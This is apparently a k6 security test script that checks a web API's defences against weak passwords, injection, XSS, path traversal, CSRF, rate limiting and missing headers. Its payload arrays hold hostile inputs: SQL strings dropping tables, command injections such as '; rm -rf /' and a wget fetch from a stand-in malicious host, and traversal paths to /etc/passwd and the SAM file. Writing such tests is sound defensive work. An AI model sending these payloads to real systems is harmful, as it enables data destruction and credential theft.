const { check } = require('k6');
const http = require('k6/http');
const { Rate } = require('k6/metrics');

// Custom metrics for security testing
const securityFailures = new Rate('security_failures');
const authFailures = new Rate('auth_failures');
const injectionAttempts = new Rate('injection_attempts');

// Test configuration
export const options = {
  vus: 10,
  duration: '5m',
  thresholds: {
    security_failures: ['rate<0.01'], // Less than 1% security failures
    auth_failures: ['rate<0.05'], // Less than 5% auth failures
    injection_attempts: ['rate<0.01'], // Less than 1% injection attempts
  },
};

const BASE_URL = __ENV.BASE_URL || 'http://localhost:3000';

// Test data
const VALID_USER = {
  email: 'securitytest@example.com',
  password: 'SecurePassword123!',
  firstName: 'Security',
  lastName: 'Test',
};

// Malicious payloads for testing
const SQL_INJECTION_PAYLOADS = [
  "' OR '1'='1",
  "'; DROP TABLE users; --",
  "' UNION SELECT * FROM users --",
  "admin'--",
  "1' OR '1' = '1' --",
];

const XSS_PAYLOADS = [
  "<script>alert('XSS')</script>",
  "javascript:alert('XSS')",
  "<img src=x onerror=alert('XSS')>",
  "';alert('XSS');//",
  "<svg onload=alert('XSS')>",
];

const COMMAND_INJECTION_PAYLOADS = [
  "; rm -rf /",
  "| cat /etc/passwd",
  "&& ls -la",
  "; whoami",
  "| wget http://malicious.com/script",
];

const PATH_TRAVERSAL_PAYLOADS = [
  "../../../etc/passwd",
  "..\\..\\..\\windows\\system32\\config\\sam",
  "....//....//....//etc/passwd",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
];

// Setup function
export function setup() {
  console.log('Setting up security test...');
  
  // Register a test user
  const registerResponse = http.post(`${BASE_URL}/api/auth/register`, JSON.stringify(VALID_USER), {
    headers: { 'Content-Type': 'application/json' },
  });
  
  if (registerResponse.status !== 201) {
    console.log('Failed to register security test user:', registerResponse.body);
  }
  
  // Login to get tokens
  const loginResponse = http.post(`${BASE_URL}/api/auth/login`, JSON.stringify({
    email: VALID_USER.email,
    password: VALID_USER.password,
  }), {
    headers: { 'Content-Type': 'application/json' },
  });
  
  let authToken = null;
  let refreshToken = null;
  
  if (loginResponse.status === 200) {
    const loginData = JSON.parse(loginResponse.body);
    authToken = loginData.accessToken;
    refreshToken = loginData.refreshToken;
    console.log('Successfully authenticated for security test');
  }
  
  return { authToken, refreshToken };
}

// Main security test function
export default function(data) {
  const { authToken, refreshToken } = data;
  
  // Test 1: Authentication Security
  testAuthenticationSecurity();
  
  // Test 2: Authorization Security
  testAuthorizationSecurity(authToken);
  
  // Test 3: Input Validation Security
  testInputValidationSecurity();
  
  // Test 4: SQL Injection Protection
  testSQLInjectionProtection();
  
  // Test 5: XSS Protection
  testXSSProtection();
  
  // Test 6: Command Injection Protection
  testCommandInjectionProtection();
  
  // Test 7: Path Traversal Protection
  testPathTraversalProtection();
  
  // Test 8: Rate Limiting
  testRateLimiting();
  
  // Test 9: CSRF Protection
  testCSRFProtection();
  
  // Test 10: Session Security
  testSessionSecurity(refreshToken);
  
  // Test 11: Headers Security
  testSecurityHeaders();
  
  // Test 12: Content Security Policy
  testContentSecurityPolicy();
}

// Authentication Security Tests
function testAuthenticationSecurity() {
  // Test weak passwords
  const weakPasswords = ['123', 'password', 'admin', 'qwerty', '123456'];
  
  weakPasswords.forEach(password => {
    const response = http.post(`${BASE_URL}/api/auth/register`, JSON.stringify({
      email: `weakpass${Date.now()}@example.com`,
      password: password,
      firstName: 'Test',
      lastName: 'User',
    }), {
      headers: { 'Content-Type': 'application/json' },
    });
    
    check(response, {
      'weak password rejected': (r) => r.status === 400,
    });
    
    if (response.status !== 400) {
      authFailures.add(1);
    }
  });
  
  // Test invalid email formats
  const invalidEmails = ['test', 'test@', '@example.com', 'test@example', 'test..test@example.com'];
  
  invalidEmails.forEach(email => {
    const response = http.post(`${BASE_URL}/api/auth/register`, JSON.stringify({
      email: email,
      password: 'ValidPassword123!',
      firstName: 'Test',
      lastName: 'User',
    }), {
      headers: { 'Content-Type': 'application/json' },
    });
    
    check(response, {
      'invalid email rejected': (r) => r.status === 400,
    });
    
    if (response.status !== 400) {
      authFailures.add(1);
    }
  });
  
  // Test brute force protection
  for (let i = 0; i < 10; i++) {
    const response = http.post(`${BASE_URL}/api/auth/login`, JSON.stringify({
      email: VALID_USER.email,
      password: 'wrongpassword',
    }), {
      headers: { 'Content-Type': 'application/json' },
    });
    
    if (i >= 5) {
      check(response, {
        'brute force protection active': (r) => r.status === 429 || r.status === 403,
      });
    }
  }
}

// Authorization Security Tests
function testAuthorizationSecurity(authToken) {
  if (!authToken) return;
  
  // Test accessing protected endpoints without token
  const protectedEndpoints = [
    '/api/auth/me',
    '/api/projects',
    '/api/analytics/stats',
    '/api/user/api-keys',
  ];
  
  protectedEndpoints.forEach(endpoint => {
    const response = http.get(`${BASE_URL}${endpoint}`);
    
    check(response, {
      'unauthorized access blocked': (r) => r.status === 401,
    });
    
    if (response.status !== 401) {
      authFailures.add(1);
    }
  });
  
  // Test accessing with invalid token
  protectedEndpoints.forEach(endpoint => {
    const response = http.get(`${BASE_URL}${endpoint}`, {
      headers: { 'Authorization': 'Bearer invalid-token' },
    });
    
    check(response, {
      'invalid token rejected': (r) => r.status === 401,
    });
    
    if (response.status !== 401) {
      authFailures.add(1);
    }
  });
  
  // Test accessing with expired token
  const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';
  
  protectedEndpoints.forEach(endpoint => {
    const response = http.get(`${BASE_URL}${endpoint}`, {
      headers: { 'Authorization': `Bearer ${expiredToken}` },
    });
    
    check(response, {
      'expired token rejected': (r) => r.status === 401,
    });
    
    if (response.status !== 401) {
      authFailures.add(1);
    }
  });
}

// Input Validation Security Tests
function testInputValidationSecurity() {
  // Test oversized payloads
  const oversizedPayload = {
    email: 'a'.repeat(1000) + '@example.com',
    password: 'ValidPassword123!',
    firstName: 'a'.repeat(1000),
    lastName: 'a'.repeat(1000),
  };
  
  const response = http.post(`${BASE_URL}/api/auth/register`, JSON.stringify(oversizedPayload), {
    headers: { 'Content-Type': 'application/json' },
  });
  
  check(response, {
    'oversized payload rejected': (r) => r.status === 400 || r.status === 413,
  });
  
  if (response.status !== 400 && response.status !== 413) {
    securityFailures.add(1);
  }
  
  // Test malformed JSON
  const malformedResponse = http.post(`${BASE_URL}/api/auth/register`, '{"email": "test@example.com", "password": "password123",}', {
    headers: { 'Content-Type': 'application/json' },
  });
  
  check(malformedResponse, {
    'malformed JSON rejected': (r) => r.status === 400,
  });
  
  if (malformedResponse.status !== 400) {
    securityFailures.add(1);
  }
}

// SQL Injection Protection Tests
function testSQLInjectionProtection() {
  SQL_INJECTION_PAYLOADS.forEach(payload => {
    const response = http.post(`${BASE_URL}/api/auth/login`, JSON.stringify({
      email: payload,
      password: 'password123',
    }), {
      headers: { 'Content-Type': 'application/json' },
    });
    
    check(response, {
      'SQL injection blocked': (r) => r.status === 400 || r.status === 401,
    });
    
    if (response.status !== 400 && response.status !== 401) {
      injectionAttempts.add(1);
    }
  });
}

// XSS Protection Tests
function testXSSProtection() {
  XSS_PAYLOADS.forEach(payload => {
    const response = http.post(`${BASE_URL}/api/auth/register`, JSON.stringify({
      email: 'test@example.com',
      password: 'ValidPassword123!',
      firstName: payload,
      lastName: 'Test',
    }), {
      headers: { 'Content-Type': 'application/json' },
    });
    
    check(response, {
      'XSS payload rejected': (r) => r.status === 400,
    });
    
    if (response.status !== 400) {
      injectionAttempts.add(1);
    }
  });
}

// Command Injection Protection Tests
function testCommandInjectionProtection() {
  COMMAND_INJECTION_PAYLOADS.forEach(payload => {
    const response = http.post(`${BASE_URL}/api/ai-chat`, JSON.stringify({
      message: payload,
      context: 'test',
    }), {
      headers: { 'Content-Type': 'application/json' },
    });
    
    check(response, {
      'command injection blocked': (r) => r.status === 400 || r.status === 401,
    });
    
    if (response.status !== 400 && response.status !== 401) {
      injectionAttempts.add(1);
    }
  });
}

// Path Traversal Protection Tests
function testPathTraversalProtection() {
  PATH_TRAVERSAL_PAYLOADS.forEach(payload => {
    const response = http.get(`${BASE_URL}/api/files/${payload}`);
    
    check(response, {
      'path traversal blocked': (r) => r.status === 400 || r.status === 404 || r.status === 403,
    });
    
    if (response.status !== 400 && response.status !== 404 && response.status !== 403) {
      injectionAttempts.add(1);
    }
  });
}

// Rate Limiting Tests
function testRateLimiting() {
  // Test rapid requests
  for (let i = 0; i < 20; i++) {
    const response = http.get(`${BASE_URL}/api/health`);
    
    if (i >= 10) {
      check(response, {
        'rate limiting active': (r) => r.status === 429,
      });
    }
  }
  
  // Test rapid login attempts
  for (let i = 0; i < 15; i++) {
    const response = http.post(`${BASE_URL}/api/auth/login`, JSON.stringify({
      email: 'rate@example.com',
      password: 'password123',
    }), {
      headers: { 'Content-Type': 'application/json' },
    });
    
    if (i >= 5) {
      check(response, {
        'login rate limiting active': (r) => r.status === 429,
      });
    }
  }
}

// CSRF Protection Tests
function testCSRFProtection() {
  // Test without CSRF token
  const response = http.post(`${BASE_URL}/api/auth/register`, JSON.stringify({
    email: 'csrf@example.com',
    password: 'ValidPassword123!',
    firstName: 'CSRF',
    lastName: 'Test',
  }), {
    headers: { 
      'Content-Type': 'application/json',
      'Origin': 'http://malicious-site.com',
    },
  });
  
  check(response, {
    'CSRF protection active': (r) => r.status === 403 || r.status === 400,
  });
  
  if (response.status !== 403 && response.status !== 400) {
    securityFailures.add(1);
  }
}

// Session Security Tests
function testSessionSecurity(refreshToken) {
  if (!refreshToken) return;
  
  // Test session fixation
  const response = http.post(`${BASE_URL}/api/auth/refresh`, JSON.stringify({
    refreshToken: refreshToken,
  }), {
    headers: { 'Content-Type': 'application/json' },
  });
  
  check(response, {
    'session refresh works': (r) => r.status === 200,
  });
  
  // Test session invalidation
  const logoutResponse = http.post(`${BASE_URL}/api/auth/logout`, JSON.stringify({
    refreshToken: refreshToken,
  }), {
    headers: { 'Content-Type': 'application/json' },
  });
  
  check(logoutResponse, {
    'session logout works': (r) => r.status === 200,
  });
  
  // Try to use invalidated session
  const invalidatedResponse = http.post(`${BASE_URL}/api/auth/refresh`, JSON.stringify({
    refreshToken: refreshToken,
  }), {
    headers: { 'Content-Type': 'application/json' },
  });
  
  check(invalidatedResponse, {
    'invalidated session rejected': (r) => r.status === 401,
  });
}

// Security Headers Tests
function testSecurityHeaders() {
  const response = http.get(`${BASE_URL}/api/health`);
  
  check(response, {
    'X-Frame-Options header present': (r) => r.headers['X-Frame-Options'] !== undefined,
    'X-Content-Type-Options header present': (r) => r.headers['X-Content-Type-Options'] !== undefined,
    'X-XSS-Protection header present': (r) => r.headers['X-XSS-Protection'] !== undefined,
    'Strict-Transport-Security header present': (r) => r.headers['Strict-Transport-Security'] !== undefined,
    'Referrer-Policy header present': (r) => r.headers['Referrer-Policy'] !== undefined,
  });
  
  const missingHeaders = [];
  if (!response.headers['X-Frame-Options']) missingHeaders.push('X-Frame-Options');
  if (!response.headers['X-Content-Type-Options']) missingHeaders.push('X-Content-Type-Options');
  if (!response.headers['X-XSS-Protection']) missingHeaders.push('X-XSS-Protection');
  
  if (missingHeaders.length > 0) {
    securityFailures.add(1);
  }
}

// Content Security Policy Tests
function testContentSecurityPolicy() {
  const response = http.get(`${BASE_URL}/api/health`);
  
  check(response, {
    'Content-Security-Policy header present': (r) => r.headers['Content-Security-Policy'] !== undefined,
  });
  
  if (!response.headers['Content-Security-Policy']) {
    securityFailures.add(1);
  }
}

// Teardown function
export function teardown(data) {
  console.log('Cleaning up security test...');
  
  // Clean up test user if needed
  if (data.refreshToken) {
    const logoutResponse = http.post(`${BASE_URL}/api/auth/logout`, JSON.stringify({
      refreshToken: data.refreshToken,
    }), {
      headers: { 'Content-Type': 'application/json' },
    });
    
    if (logoutResponse.status === 200) {
      console.log('Successfully logged out security test user');
    }
  }
} 